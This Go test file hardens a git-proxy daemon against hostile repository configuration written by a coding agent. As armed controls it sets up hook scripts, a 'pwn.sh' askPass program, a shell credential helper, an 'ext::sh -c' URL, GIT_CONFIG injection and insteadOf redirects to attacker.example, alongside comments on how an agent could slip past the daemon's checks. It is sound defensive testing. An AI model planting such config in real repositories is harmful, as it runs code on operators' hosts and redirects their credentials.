package agentd

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// gitproxy_realgit_test.go runs REAL git against a throwaway repository.
//
// Every other test in this package swaps the subprocess boundary, so it can
// only assert what argv the daemon BUILT — never what git does with it. That
// gap is not theoretical: three hardening measures were shipped, reviewed and
// believed effective before direct experiment showed they were not
// (`-c remote.<n>.uploadpack=` never displaces a repo-local value; a
// URL-scoped `http.<url>.proxy` outranks a generic `-c http.proxy=`;
// `core.askPass` was not covered at all and is consulted before the terminal).
//
// So these tests assert the property that actually matters — "the pin HAS the
// claimed effect" — and each pairs the pinned run with a CONTROL run proving
// the hostile configuration would otherwise have worked. A test that only
// showed "nothing bad happened" could pass because the attack was never armed.
//
// Everything here is offline: no test contacts a network host.

// gitAvailable skips when the runner has no usable git.
func gitAvailable(t *testing.T) string {
	t.Helper()
	path, err := exec.LookPath("git")
	if err != nil {
		t.Skip("git not installed; skipping real-git hardening test")
	}
	return path
}

// realGitRepo builds a repository with one commit, plus a bare "remote" beside
// it, and returns (workTree, bareRemote).
func realGitRepo(t *testing.T, gitPath string) (string, string) {
	t.Helper()
	// EvalSymlinks the temp root, because git canonicalises the paths it
	// reports and these tests compare against them. On macOS t.TempDir() hands
	// back /var/folders/… while /var is a symlink to /private/var, so a raw
	// fixture path and git's answer differ on that platform and agree on Linux
	// — which is a test that passes at home and fails in CI, not a real
	// difference. resolveProxyRepo resolves the same way in production.
	root, err := filepath.EvalSymlinks(t.TempDir())
	require.NoError(t, err)
	work := filepath.Join(root, "work")
	bare := filepath.Join(root, "origin.git")
	require.NoError(t, os.MkdirAll(work, 0o755))

	run := func(dir string, args ...string) {
		t.Helper()
		cmd := exec.Command(gitPath, args...)
		cmd.Dir = dir
		// A hermetic environment: the developer's own git config must not
		// change what this test observes.
		cmd.Env = []string{
			"PATH=" + os.Getenv("PATH"),
			"HOME=" + root,
			"GIT_CONFIG_GLOBAL=" + filepath.Join(root, "gitconfig-none"),
			"GIT_CONFIG_SYSTEM=" + filepath.Join(root, "gitconfig-none"),
			"GIT_TERMINAL_PROMPT=0",
			"LC_ALL=C",
		}
		out, err := cmd.CombinedOutput()
		require.NoErrorf(t, err, "git %s: %s", strings.Join(args, " "), out)
	}
	run(root, "init", "-q", "--bare", bare)
	run(work, "init", "-q", ".")
	run(work, "config", "user.email", "t@example.invalid")
	run(work, "config", "user.name", "t")
	require.NoError(t, os.WriteFile(filepath.Join(work, "a.txt"), []byte("hi\n"), 0o644))
	run(work, "add", "a.txt")
	run(work, "commit", "-qm", "init")
	run(work, "branch", "-M", "feat")
	run(work, "remote", "add", "origin", bare)
	return work, bare
}

// realGitEnv is the environment the proxy would construct, pinned to a
// throwaway HOME so the developer's own config is out of scope.
func realGitEnv(home string) []string {
	return []string{
		"PATH=" + os.Getenv("PATH"),
		"HOME=" + home,
		"GIT_CONFIG_GLOBAL=" + filepath.Join(home, "gitconfig-none"),
		"GIT_CONFIG_SYSTEM=" + filepath.Join(home, "gitconfig-none"),
		"GIT_TERMINAL_PROMPT=0",
		"LC_ALL=C",
	}
}

// TestRealGit_HooksPinSuppressesRepoHooks proves the single most important pin.
// `.git/hooks/pre-push` is a file the agent can write, and without
// core.hooksPath it runs on the daemon host as the operator.
func TestRealGit_HooksPinSuppressesRepoHooks(t *testing.T) {
	gitPath := gitAvailable(t)
	work, _ := realGitRepo(t, gitPath)
	home := filepath.Dir(work)

	evidence := filepath.Join(home, "hook-evidence")
	for _, hook := range []string{"pre-push", "reference-transaction"} {
		script := "#!/bin/sh\necho " + hook + " >> " + evidence + "\nexit 0\n"
		require.NoError(t, os.WriteFile(
			filepath.Join(work, ".git", "hooks", hook), []byte(script), 0o755))
	}

	push := func(extra []string, target string) {
		args := append(append([]string{}, extra...), "push", "--", "origin",
			"refs/heads/feat:refs/heads/"+target)
		cmd := exec.Command(gitPath, args...)
		cmd.Dir = work
		cmd.Env = realGitEnv(home)
		out, err := cmd.CombinedOutput()
		require.NoErrorf(t, err, "push: %s", out)
	}

	// CONTROL: the hooks are armed and really do fire. Without this the
	// pinned run below could pass for the wrong reason.
	push([]string{"-c", "protocol.file.allow=always"}, "control")
	control, err := os.ReadFile(evidence)
	require.NoError(t, err, "the control run must have fired the hooks")
	assert.Contains(t, string(control), "pre-push")
	assert.Contains(t, string(control), "reference-transaction")

	// PINNED: the daemon's real pin set, plus the one relaxation a local
	// "remote" needs. Nothing may fire.
	require.NoError(t, os.Remove(evidence))
	hooksDir := filepath.Join(home, "no-hooks")
	require.NoError(t, os.MkdirAll(hooksDir, 0o700))
	pins := gitProxyConfigPins(hooksDir, "ssh -o BatchMode=yes", nil)
	push(append(pins, "-c", "protocol.file.allow=always"), "pinned")

	_, err = os.Stat(evidence)
	assert.True(t, os.IsNotExist(err),
		"core.hooksPath must suppress every repo hook; evidence exists: %v", err)
}

// TestRealGit_AskPassPinBlocksCredentialProgram proves the pin that closes
// arbitrary code execution on the daemon host.
//
// `git credential fill` exercises the same helper/askpass chain a fetch or
// push does, without touching a network.
func TestRealGit_AskPassPinBlocksCredentialProgram(t *testing.T) {
	gitPath := gitAvailable(t)
	work, _ := realGitRepo(t, gitPath)
	home := filepath.Dir(work)

	evidence := filepath.Join(home, "askpass-evidence")
	pwn := filepath.Join(home, "pwn.sh")
	require.NoError(t, os.WriteFile(pwn,
		[]byte("#!/bin/sh\necho RAN >> "+evidence+"\necho dummy\n"), 0o755))

	cmd := exec.Command(gitPath, "config", "core.askPass", pwn)
	cmd.Dir = work
	cmd.Env = realGitEnv(home)
	require.NoError(t, cmd.Run())

	fill := func(extra []string) {
		args := append(append([]string{}, extra...), "credential", "fill")
		c := exec.Command(gitPath, args...)
		c.Dir = work
		c.Env = realGitEnv(home)
		c.Stdin = strings.NewReader("protocol=https\nhost=example.invalid\n\n")
		_, _ = c.CombinedOutput() // failure is fine; we only care what ran
	}

	// CONTROL: the repo-local askPass program really does execute.
	fill(nil)
	control, err := os.ReadFile(evidence)
	require.NoError(t, err,
		"the control run must have executed core.askPass, or this test proves nothing")
	assert.Contains(t, string(control), "RAN")

	// PINNED: it must not.
	require.NoError(t, os.Remove(evidence))
	hooksDir := filepath.Join(home, "no-hooks")
	require.NoError(t, os.MkdirAll(hooksDir, 0o700))
	fill(gitProxyConfigPins(hooksDir, "ssh -o BatchMode=yes", nil))

	_, err = os.Stat(evidence)
	assert.True(t, os.IsNotExist(err),
		"core.askPass must be pinned empty; the program ran: %v", err)
}

// TestRealGit_CredentialHelperResetDropsRepoLocalHelper proves both halves of
// the helper handling: a repo-local helper (an arbitrary command) is dropped,
// and the operator's own global helper still runs.
func TestRealGit_CredentialHelperResetDropsRepoLocalHelper(t *testing.T) {
	gitPath := gitAvailable(t)
	work, _ := realGitRepo(t, gitPath)
	home := filepath.Dir(work)

	repoEvidence := filepath.Join(home, "repo-helper-evidence")
	operatorEvidence := filepath.Join(home, "operator-helper-evidence")
	cmd := exec.Command(gitPath, "config", "credential.helper",
		"!f() { echo RAN >> "+repoEvidence+"; echo username=x; echo password=y; }; f")
	cmd.Dir = work
	cmd.Env = realGitEnv(home)
	require.NoError(t, cmd.Run())

	fill := func(extra []string) {
		args := append(append([]string{}, extra...), "credential", "fill")
		c := exec.Command(gitPath, args...)
		c.Dir = work
		c.Env = realGitEnv(home)
		c.Stdin = strings.NewReader("protocol=https\nhost=example.invalid\n\n")
		_, _ = c.CombinedOutput()
	}

	// CONTROL: the repo-local helper really does run.
	fill(nil)
	_, err := os.Stat(repoEvidence)
	require.NoError(t, err, "the control run must have used the repo-local helper")

	// PINNED, with an operator helper re-added exactly as the daemon does.
	require.NoError(t, os.Remove(repoEvidence))
	hooksDir := filepath.Join(home, "no-hooks")
	require.NoError(t, os.MkdirAll(hooksDir, 0o700))
	operatorHelper := "!f() { echo RAN >> " + operatorEvidence + "; echo username=op; echo password=op; }; f"
	fill(gitProxyConfigPins(hooksDir, "ssh -o BatchMode=yes", []string{operatorHelper}))

	_, err = os.Stat(repoEvidence)
	assert.True(t, os.IsNotExist(err), "the repo-local helper must be dropped")
	_, err = os.Stat(operatorEvidence)
	assert.NoError(t, err, "the operator's own helper must still run")
}

// TestRealGit_UploadPackPinIsIneffectiveButTheFlagWorks is a REGRESSION LOCK on
// the git behaviour this design depends on.
//
// It asserts the surprising half explicitly: a `-c remote.<n>.uploadpack=`
// override does NOT displace a repo-local value. If a future git made `-c` win
// here, this test fails — and that is the signal to revisit whether the refusal
// in refuseHostileRepoConfig can be relaxed. Encoding the quirk is what stops
// someone "simplifying" the refusal back into a pin that does nothing.
func TestRealGit_UploadPackPinIsIneffectiveButTheFlagWorks(t *testing.T) {
	gitPath := gitAvailable(t)
	work, bare := realGitRepo(t, gitPath)
	home := filepath.Dir(work)

	evidence := filepath.Join(home, "uploadpack-evidence")
	evil := filepath.Join(home, "evil-uploadpack.sh")
	require.NoError(t, os.WriteFile(evil,
		[]byte("#!/bin/sh\necho RAN >> "+evidence+"\nexit 9\n"), 0o755))
	cmd := exec.Command(gitPath, "config", "remote.origin.uploadpack", evil)
	cmd.Dir = work
	cmd.Env = realGitEnv(home)
	require.NoError(t, cmd.Run())

	lsRemote := func(extra []string) {
		args := append(append([]string{}, extra...), "ls-remote", "--", "origin")
		c := exec.Command(gitPath, args...)
		c.Dir = work
		c.Env = realGitEnv(home)
		_, _ = c.CombinedOutput()
	}
	_ = bare

	// The `-c` override does NOT stop it — the documented-by-experiment quirk.
	lsRemote([]string{"-c", "protocol.file.allow=always", "-c", "remote.origin.uploadpack=git-upload-pack"})
	_, err := os.Stat(evidence)
	assert.NoError(t, err,
		"git changed: a -c remote.<n>.uploadpack override now wins. "+
			"Revisit refuseHostileRepoConfig — the refusal may be relaxable.")

	// The FLAG does stop it. This is what the proxy actually relies on.
	require.NoError(t, os.Remove(evidence))
	lsRemote([]string{"-c", "protocol.file.allow=always", gitProxyUploadPack})
	_, err = os.Stat(evidence)
	assert.True(t, os.IsNotExist(err),
		"--upload-pack must override the repo-local value; the evil program ran")
}

// TestRealGit_ProtocolPinsRefuseCommandTransports proves that even if a hostile
// URL somehow got past parseRemoteURL, git itself would refuse to speak the
// command-executing transports.
//
// Each URL is run twice — once WITHOUT the pins — because the two cases are not
// equally load-bearing and the test should say which is which:
//
//   - file:// is genuinely held by `protocol.file.allow=never`. Unpinned, git
//     happily lists refs from a local path, which is how an agent would reach a
//     repository the allow-list never saw.
//   - ext:: is already refused by git's own default (verified on 2.43, where
//     protocol.ext is not allowed for a config-supplied remote). The pin is
//     defence-in-depth against a git that defaults differently, so its control
//     is EXPECTED to fail too — asserting otherwise would be asserting git's
//     default rather than this code.
func TestRealGit_ProtocolPinsRefuseCommandTransports(t *testing.T) {
	gitPath := gitAvailable(t)
	work, bare := realGitRepo(t, gitPath)
	home := filepath.Dir(work)
	hooksDir := filepath.Join(home, "no-hooks")
	require.NoError(t, os.MkdirAll(hooksDir, 0o700))

	evidence := filepath.Join(home, "ext-evidence")
	pins := gitProxyConfigPins(hooksDir, "ssh -o BatchMode=yes", nil)

	lsRemote := func(url string, withPins bool) (string, error) {
		var args []string
		if withPins {
			args = append(args, pins...)
		}
		args = append(args, "ls-remote", "--", url)
		c := exec.Command(gitPath, args...)
		c.Dir = work
		c.Env = realGitEnv(home)
		out, err := c.CombinedOutput()
		return string(out), err
	}

	// file:// — the pin is the only thing stopping this.
	fileURL := "file://" + bare
	out, err := lsRemote(fileURL, false)
	require.NoErrorf(t, err, "CONTROL: unpinned file:// must succeed, or the pin "+
		"below is not being tested; output=%s", out)

	out, err = lsRemote(fileURL, true)
	assert.Errorf(t, err, "git must refuse %q; output=%s", fileURL, out)
	assert.Contains(t, strings.ToLower(out), "not allowed",
		"the refusal should come from the protocol policy")

	// ext:: — refused with the pins; git's own default refuses it too.
	extURL := "ext::sh -c 'echo RAN >> " + evidence + "'"
	out, err = lsRemote(extURL, true)
	assert.Errorf(t, err, "git must refuse %q; output=%s", extURL, out)
	assert.Contains(t, strings.ToLower(out), "not allowed")

	_, statErr := os.Stat(evidence)
	assert.True(t, os.IsNotExist(statErr), "no ext:: command may have run")
}

// TestRealGit_ProxyEnvExcludesInheritedGitVariables checks the constructed
// environment against a real git: GIT_CONFIG_COUNT is the sharpest of these,
// because it injects configuration that behaves exactly like `-c`.
func TestRealGit_ProxyEnvExcludesInheritedGitVariables(t *testing.T) {
	gitPath := gitAvailable(t)
	work, _ := realGitRepo(t, gitPath)
	home := filepath.Dir(work)

	// Arm the environment the daemon might be running under.
	t.Setenv("GIT_CONFIG_COUNT", "1")
	t.Setenv("GIT_CONFIG_KEY_0", "core.hooksPath")
	t.Setenv("GIT_CONFIG_VALUE_0", "/tmp/attacker-hooks")
	t.Setenv("HOME", home)
	t.Setenv("PATH", os.Getenv("PATH"))

	args := append(gitProxyConfigPins("/daemon/no-hooks", "ssh", nil),
		"config", "--get", "core.hooksPath")
	c := exec.Command(gitPath, args...)
	c.Dir = work
	c.Env = gitProxyEnv() // the function under test
	out, err := c.Output()
	require.NoError(t, err)
	assert.Equal(t, "/daemon/no-hooks", strings.TrimSpace(string(out)),
		"an inherited GIT_CONFIG_* must not reach the child and displace the pin")
}

// TestRealGit_RunProxyCommandBoundsOutputAndSurvivesFailure exercises the
// production seam itself rather than a stub.
func TestRealGit_RunProxyCommandBoundsOutputAndSurvivesFailure(t *testing.T) {
	gitPath := gitAvailable(t)
	work, _ := realGitRepo(t, gitPath)

	res, err := runProxyCommand(context.Background(), ProxyCommand{
		Tool: "git", Path: gitPath,
		Args: []string{"rev-parse", "--abbrev-ref", "HEAD"},
		Dir:  work, Env: gitProxyEnv(),
	})
	require.NoError(t, err)
	assert.Equal(t, 0, res.ExitCode)
	assert.Equal(t, "feat", strings.TrimSpace(res.Stdout))

	// A failing command is an answer, not an error: the seam must report the
	// exit code rather than returning err, or the handlers would turn a
	// rejected push into a daemon fault.
	res, err = runProxyCommand(context.Background(), ProxyCommand{
		Tool: "git", Path: gitPath,
		Args: []string{"rev-parse", "--verify", "refs/heads/definitely-not-a-branch"},
		Dir:  work, Env: gitProxyEnv(),
	})
	require.NoError(t, err, "a non-zero git exit is an answer, not a transport failure")
	assert.NotEqual(t, 0, res.ExitCode)
}

// TestRealGit_ShowScopeAttributesIncludedKeysToTheIncludingScope locks the
// assumption the credential-config gate rests on.
//
// The gate has to tell a key an AGENT wrote from one the OPERATOR set, and it
// does that by filtering `config --show-scope` down to local and worktree. The
// obvious alternative — `git config --local --get-regexp` — is not equivalent
// and is not safe: it does NOT report a key that reached the repository through
// `include.path`, so an agent could hide a credential helper behind an include
// and the gate would see a clean repository. --show-scope does report it, and
// attributes it to the scope of the file that pulled it in.
func TestRealGit_ShowScopeAttributesIncludedKeysToTheIncludingScope(t *testing.T) {
	gitPath := gitAvailable(t)
	work, _ := realGitRepo(t, gitPath)
	home := filepath.Dir(work)

	included := filepath.Join(home, "sneaky.gitconfig")
	require.NoError(t, os.WriteFile(included,
		[]byte("[credential \"https://github.com\"]\n\thelper = \"!evil\"\n"), 0o600))

	set := func(args ...string) {
		t.Helper()
		c := exec.Command(gitPath, args...)
		c.Dir = work
		c.Env = realGitEnv(home)
		out, err := c.CombinedOutput()
		require.NoErrorf(t, err, "git %s: %s", strings.Join(args, " "), out)
	}
	set("config", "include.path", included)

	probe := func(scoped bool) string {
		t.Helper()
		args := []string{"config"}
		if scoped {
			args = append(args, "--show-scope")
		}
		args = append(args, "--name-only", "--get-regexp", "--", `^credential\.`)
		// --local, the tempting shortcut, is what the second half asserts is
		// insufficient; both probes read the same repository.
		if !scoped {
			args = append([]string{"config", "--local"}, args[1:]...)
		}
		c := exec.Command(gitPath, args...)
		c.Dir = work
		c.Env = realGitEnv(home)
		out, _ := c.Output() // exit 1 = no matching key, which is an answer
		return string(out)
	}

	// The shortcut MISSES it — this is the control that proves the gate's
	// choice of probe is load-bearing rather than stylistic.
	assert.NotContains(t, probe(false), "credential.https://github.com.helper",
		"--local is expected to miss an included key; if this ever changes the "+
			"comment in configKeysInScopes needs revisiting, not the gate")

	// --show-scope sees it, and calls it local.
	assert.Contains(t, probe(true), "local\tcredential.https://github.com.helper",
		"the gate reads this exact shape: <scope>\\t<key>")
}

// TestRealGit_LinkedWorktreeIsAcceptedOnlyWithAMatchingBackPointer is the test
// that had to be written against real git, because the thing it pins is
// something git itself does NOT check.
//
// `tclaude worktree` creates linked worktrees, so that is the layout a tclaude
// agent normally runs in, and the proxy has to work there. But a linked
// worktree and a hostile `.git` gitfile are the same shape: point a hand-written
// gitfile at another repository's existing .git/worktrees/<name> entry and git
// reports YOUR directory as the toplevel while handing over THEIR remotes,
// objects and config. Nothing in git objects.
//
// Both halves run here — the legitimate worktree must be admitted, and the
// forgery aimed at it must be refused — because a test that only showed one
// could pass for the wrong reason.
func TestRealGit_LinkedWorktreeIsAcceptedOnlyWithAMatchingBackPointer(t *testing.T) {
	gitPath := gitAvailable(t)
	main, _ := realGitRepo(t, gitPath)
	home := filepath.Dir(main)

	run := func(dir string, args ...string) {
		t.Helper()
		cmd := exec.Command(gitPath, args...)
		cmd.Dir = dir
		cmd.Env = realGitEnv(home)
		out, err := cmd.CombinedOutput()
		require.NoErrorf(t, err, "git %s: %s", strings.Join(args, " "), out)
	}
	revParse := func(dir, flag string) string {
		t.Helper()
		cmd := exec.Command(gitPath, "rev-parse", "--path-format=absolute", flag)
		cmd.Dir = dir
		cmd.Env = realGitEnv(home)
		out, err := cmd.Output()
		require.NoError(t, err)
		return strings.TrimSpace(string(out))
	}

	// A genuine linked worktree of `main`.
	linked := filepath.Join(home, "linked")
	run(main, "worktree", "add", "-q", linked, "-b", "side")

	linkedRoot := revParse(linked, "--show-toplevel")
	linkedGitDir := revParse(linked, "--absolute-git-dir")
	require.NotEqual(t, linkedRoot, filepath.Dir(linkedGitDir),
		"the fixture is only meaningful if the git dir really is outside the work tree")

	fault := acceptLinkedWorktree(context.Background(), gitPath, linked, linkedRoot, linkedGitDir)
	assert.Nil(t, fault, "a real linked worktree must be proxyable; got %+v", fault)

	// The forgery: an ordinary directory whose .git file points at the linked
	// worktree's registration inside main's admin directory.
	forged := filepath.Join(home, "forged")
	require.NoError(t, os.MkdirAll(forged, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(forged, ".git"),
		[]byte("gitdir: "+linkedGitDir+"\n"), 0o644))

	// CONTROL: git accepts it completely — this is the attack, armed.
	//
	// Compared canonically, not literally. git reports the path it gets from
	// getcwd(), which is always symlink-resolved, so a fixture path that still
	// contains a symlinked component would differ from git's answer as a matter
	// of spelling rather than of location — that is what broke this on macOS,
	// where TMPDIR lives under /var → /private/var.
	assert.Equal(t, canonicalProxyPath(forged), canonicalProxyPath(revParse(forged, "--show-toplevel")),
		"git reports the attacker's own directory as the work tree")
	assert.Equal(t, revParse(main, "--git-common-dir"), revParse(forged, "--git-common-dir"),
		"...while the common dir, and therefore the config and remotes, is the victim's")

	fault = acceptLinkedWorktree(context.Background(), gitPath,
		forged, revParse(forged, "--show-toplevel"), revParse(forged, "--absolute-git-dir"))
	require.NotNil(t, fault, "a forged worktree link must be refused")
	assert.Contains(t, fault.Msg, "different work tree",
		"the refusal should say which check failed")

	// And the plain redirect — a gitfile naming a whole repository rather than a
	// worktree entry — stays refused by the structural check.
	plain := filepath.Join(home, "plain")
	require.NoError(t, os.MkdirAll(plain, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(plain, ".git"),
		[]byte("gitdir: "+filepath.Join(main, ".git")+"\n"), 0o644))
	fault = acceptLinkedWorktree(context.Background(), gitPath,
		plain, revParse(plain, "--show-toplevel"), revParse(plain, "--absolute-git-dir"))
	assert.NotNil(t, fault, "a gitfile pointing at another repository must stay refused")
}

// TestRealGit_ProxyOwnPinsDoNotTripItsOwnConfigGates is the regression for a
// bug that made the feature refuse EVERY request in production while every
// stub-backed test passed.
//
// refuseHostileRepoConfig asks `git config --get-regexp ^http\.` through the
// same hardened invocation as everything else — which carries `-c http.proxy=`
// from gitProxyConfigPins. Git reports command-scope values like any other, so
// the gate found `http.proxy`, correctly identified it as a key that can
// redirect the connection, and refused. Its own pin. For every repository.
//
// No stub could catch this: the fake answers config probes from a fixture map
// and never sees the argv the daemon really builds. Only real git does.
func TestRealGit_ProxyOwnPinsDoNotTripItsOwnConfigGates(t *testing.T) {
	gitPath := gitAvailable(t)
	work, _ := realGitRepo(t, gitPath)
	home := filepath.Dir(work)
	hooksDir := filepath.Join(home, "no-hooks")
	require.NoError(t, os.MkdirAll(hooksDir, 0o700))

	// gitProxyEnv forwards HOME, so point it at the throwaway root; the
	// developer's own ~/.gitconfig must not decide this test.
	t.Setenv("HOME", home)

	s := &gitProxySession{
		gitPath:  gitPath,
		repoRoot: work,
		pins:     gitProxyConfigPins(hooksDir, "ssh -o BatchMode=yes", nil),
	}
	require.Contains(t, s.pins, "http.proxy=",
		"the fixture is only meaningful while the proxy still pins this key")

	fault := refuseHostileRepoConfig(context.Background(), s, "origin")
	assert.Nil(t, fault,
		"a clean repository must pass the gates; the proxy's own -c pins are not "+
			"repository configuration and must never be read as hostile: %+v", fault)

	// CONTROL: the gate is armed. A key the REPOSITORY sets is still refused,
	// so the assertion above cannot be passing because the check does nothing.
	set := exec.Command(gitPath, "config", "http.sslVerify", "false")
	set.Dir = work
	set.Env = realGitEnv(home)
	out, err := set.CombinedOutput()
	require.NoErrorf(t, err, "arming the control: %s", out)

	fault = refuseHostileRepoConfig(context.Background(), s, "origin")
	require.NotNil(t, fault, "a repo-set http.sslVerify must still be refused")
	assert.Contains(t, fault.Msg, "http.sslverify")
}

// TestRealGit_RemoteGetURLAppliesInsteadOf pins the fact the insteadOf defence
// actually rests on, which had no real-git coverage and whose stub modelled the
// opposite.
//
// The code once claimed url.*.insteadOf was caught by requiring the validated
// URL to be a fixed point of `ls-remote --get-url`. It is not: `git remote
// get-url` ALREADY returns the rewritten destination, so the URL that reaches
// parseRemoteURL and the allow-list is the one git would really dial, and the
// fixed point therefore always holds. The allow-list is the barrier.
//
// If a future git stops rewriting in `remote get-url`, this test fails — and it
// should, because the real destination would then be moving out from under the
// allow-list, with only the fixed-point check left to notice.
func TestRealGit_RemoteGetURLAppliesInsteadOf(t *testing.T) {
	gitPath := gitAvailable(t)
	work, _ := realGitRepo(t, gitPath)
	home := filepath.Dir(work)

	run := func(args ...string) string {
		t.Helper()
		c := exec.Command(gitPath, args...)
		c.Dir = work
		c.Env = realGitEnv(home)
		out, err := c.CombinedOutput()
		require.NoErrorf(t, err, "git %s: %s", strings.Join(args, " "), out)
		return strings.TrimSpace(string(out))
	}
	run("remote", "set-url", "origin", "https://github.com/tofutools/tclaude.git")
	run("config", `url.https://attacker.example/.insteadOf`, "https://github.com/")

	got := run("remote", "get-url", "--all", "origin")
	assert.Equal(t, "https://attacker.example/tofutools/tclaude.git", got,
		"remote get-url must report the REWRITTEN destination — the allow-list is "+
			"applied to this string, and that is what stops an insteadOf redirect")

	// …and it is consequently already a fixed point, which is why the
	// fixed-point check is defence-in-depth rather than the live barrier.
	assert.Equal(t, got, run("ls-remote", "--get-url", "--", got))
}

// TestLinkedWorktreeToleratesANonCanonicalCommonDir.
//
// The gate compares <common>/worktrees/<name> against a gitDir that
// resolveProxyRepo has already run through EvalSymlinks. If the two sides are
// spelled differently — one resolved, one not — a perfectly ordinary worktree
// is refused as redirected.
//
// Git 2.43 canonicalises `rev-parse --path-format=absolute --git-common-dir`,
// so this cannot currently be provoked through git; the probe is stubbed to
// return the symlinked spelling instead. That is the honest scope of this test:
// it pins the gate's tolerance of a non-canonical answer, not a git behaviour.
// Both paths on disk are real, so the resolution being asserted is real too.
func TestLinkedWorktreeToleratesANonCanonicalCommonDir(t *testing.T) {
	// Canonical, because resolveProxyRepo hands acceptLinkedWorktree an
	// EvalSymlinks-resolved gitDir in production. The ONLY non-canonical path
	// here must be the stubbed probe answer below — that is the thing under
	// test. (Without this, macOS supplies a second, accidental symlink via
	// /var → /private/var and the test stops testing what it names.)
	realRoot, err := filepath.EvalSymlinks(t.TempDir())
	require.NoError(t, err)
	commonDir := filepath.Join(realRoot, "main", ".git")
	gitDir := filepath.Join(commonDir, "worktrees", "side")
	require.NoError(t, os.MkdirAll(gitDir, 0o700))

	root := filepath.Join(realRoot, "side")
	require.NoError(t, os.MkdirAll(root, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(gitDir, "gitdir"),
		[]byte(filepath.Join(root, ".git")+"\n"), 0o600))

	// A second, symlinked spelling of the same common dir.
	alias := filepath.Join(t.TempDir(), "alias")
	require.NoError(t, os.Symlink(realRoot, alias))
	aliasCommon := filepath.Join(alias, "main", ".git")

	restore := SetProxyExecForTest(func(_ context.Context, _ ProxyCommand) (ProxyResult, error) {
		return ProxyResult{Stdout: aliasCommon + "\n"}, nil
	})
	defer restore()

	fault := acceptLinkedWorktree(context.Background(), "/usr/bin/git", root, root, gitDir)
	assert.Nil(t, fault,
		"the same directory under two spellings must be recognised as one; got %+v", fault)
}

// TestRealGit_TransferDirIgnoresAgentInsteadOf is the proof that the isolated
// transfer actually closes the check/use race, rather than merely looking like
// it should.
//
// `url.*.insteadOf` is the sharpest of the unpinnable keys: it has no reset
// form, so no `-c` override can neutralise it, and the refusal that catches it
// runs in a different process from the push. An agent that rewrites
// .git/config in that window redirects the credentialed command to a host the
// allow-list never saw.
//
// Both halves run. The CONTROL pushes from the agent's own repository with the
// hostile config in place and must be redirected — without it, the isolated run
// below could pass because the attack was never armed.
func TestRealGit_TransferDirIgnoresAgentInsteadOf(t *testing.T) {
	gitPath := gitAvailable(t)
	work, bare := realGitRepo(t, gitPath)
	home := filepath.Dir(work)

	git := func(dir string, args ...string) (string, error) {
		c := exec.Command(gitPath, args...)
		c.Dir = dir
		c.Env = realGitEnv(home)
		out, err := c.CombinedOutput()
		return string(out), err
	}
	// The agent rewrites file:// to a host that does not exist. Anything that
	// reads this config and dials file:// goes there instead.
	_, err := git(work, "config", `url.https://attacker.invalid/.insteadOf`, "file://")
	require.NoError(t, err)

	sha, err := git(work, "rev-parse", "HEAD")
	require.NoError(t, err)
	head := strings.TrimSpace(sha)
	dest := "file://" + bare

	// CONTROL: from the agent's repository, the push is redirected.
	out, err := git(work, "-c", "protocol.file.allow=always", "push", dest, head+":refs/heads/control")
	require.Error(t, err, "the fixture must actually be armed; output=%s", out)
	assert.Contains(t, out, "attacker.invalid",
		"the control must show the redirect this test exists to defeat")

	// ISOLATED: the same push, from a daemon-owned transfer directory that
	// borrows the agent's objects and never reads its configuration.
	xfer := filepath.Join(home, "xfer.git")
	_, err = git(home, "init", "--bare", "-q", xfer)
	require.NoError(t, err)
	objects, err := git(work, "rev-parse", "--path-format=absolute", "--git-path", "objects")
	require.NoError(t, err)
	require.NoError(t, os.WriteFile(filepath.Join(xfer, "objects", "info", "alternates"),
		[]byte(strings.TrimSpace(objects)+"\n"), 0o600))

	out, err = git(xfer, "--git-dir", xfer, "-c", "protocol.file.allow=always",
		"push", dest, head+":refs/heads/isolated")
	require.NoErrorf(t, err, "the isolated push must reach the real destination; output=%s", out)
	assert.NotContains(t, out, "attacker.invalid")

	// And it really landed, from objects that were never copied.
	landed, err := git(home, "--git-dir", bare, "rev-parse", "refs/heads/isolated")
	require.NoError(t, err)
	assert.Equal(t, head, strings.TrimSpace(landed))
}
